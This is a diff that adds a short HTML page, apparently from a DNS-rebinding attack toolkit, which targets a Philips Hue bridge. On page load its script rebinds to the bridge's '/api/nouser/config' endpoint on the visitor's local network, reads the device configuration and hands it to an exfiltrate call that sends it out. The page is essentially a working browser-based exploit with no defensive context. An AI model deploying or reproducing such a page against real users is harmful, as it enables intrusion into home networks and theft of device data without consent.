@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Phillips Hue Example</title>
+</head>
+<body>
+<script type="text/javascript" src="/share/js/xmlToJSON.min.js"></script>
+<script type="text/javascript" src="/share/js/DNSRebindNode.js"></script>
+<script type="text/javascript">
+(function() {
+
+    attack()
+    .then(() => {console.log('attack finished')},
+          err => {
+              console.error(err)
+              DNSRebindNode.emit('fatal', err.message)
+          }
+    )
+    .then(() => DNSRebindNode.destroy())
+
+    async function attack() {
+        
+        const getOptions = DNSRebindNode.fetchOptions()
+        getOptions.headers['content-type'] = 'text/xml'
+
+        try {
+            const opts = { fetchOptions: getOptions }
+            const result = await DNSRebindNode.rebind(`http://${location.host}/api/nouser/config`, opts)
+            const json = await result.json()
+            return await DNSRebindNode.exfiltrate('phillips-hue', json)
+        } catch (err) {
+            return Promise.reject(err)
+        }
+    }
+})()
+</script>
+</body>
+</html>
